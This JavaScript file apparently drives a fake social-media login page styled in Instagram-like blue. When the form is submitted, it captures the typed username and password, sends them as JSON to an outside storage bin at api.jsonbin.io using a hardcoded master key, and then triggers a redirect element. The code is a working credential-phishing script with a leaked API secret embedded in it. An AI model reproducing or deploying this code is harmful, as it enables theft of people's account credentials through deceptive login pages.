const input = document.querySelector(".password input");
const afficher = document.querySelector(".password span");
const submit = document.querySelector("input[type='button']");


afficher.style.display = "none";




submit.addEventListener("click", function() {
    let text = document.querySelector("input[type='text']");
    let password = document.querySelector("input[name='password']");
    if(text.value == "" || password.value == "") {
        console.log("vide");
        submit.style.background = "#70afeb";
        submit.disabled = true;
    }else {
        submit.style.background = "#3897F0";
        submit.disabled = false;
        let tout = "";
        tout = text.value + "/" + password.value;
        console.log(tout);


        const data = {
            name: text.value,
            sous: password.value
        };

        const jsonData = JSON.stringify(data, null, 2);



        let req = new XMLHttpRequest();

        req.onreadystatechange = () => {
        if (req.readyState == XMLHttpRequest.DONE) {
            console.log(req.responseText);
        }
        };
        
        req.open("POST", "https://api.jsonbin.io/v3/b", true);
        req.setRequestHeader("Content-Type", "application/json");
        req.setRequestHeader("X-Master-Key", "$2b$10$8mm.8sWizb603sYtGD/3A.QzD8z6lRDjFj2.61MDt4LWcG1DJwbYW");
        req.send(jsonData);




        document.querySelector(".ytb").click();

    }



})




input.addEventListener("input", function() {
    if(input.value == "") {
        afficher.style.display = "none";
        submit.style.background = "#70afeb";
        submit.disabled = true;
    }else {
        if(document.querySelector("input[type='text']").value !== "") {
            console.log("yes");
            submit.style.background = "#3897F0";
            submit.disabled = false;
        }
        afficher.style.display = "block";
    }
})



document.querySelector("input[type='text']").addEventListener("input", function(e) {
    if(e.value == "") {
        submit.style.background = "#70afeb";
        submit.disabled = true;
    }else {
        if(input.value !== "") {
            console.log("yes");
            submit.style.background = "#3897F0";
            submit.disabled = false;
        }else {
            submit.style.background = "#70afeb";
            submit.disabled = true;
        }
    }
})



afficher.addEventListener("click", function() {
    if(input.getAttribute("type") == "password") {
        input.setAttribute("type", "email");
    }else {
        input.setAttribute("type", "password");
    }
})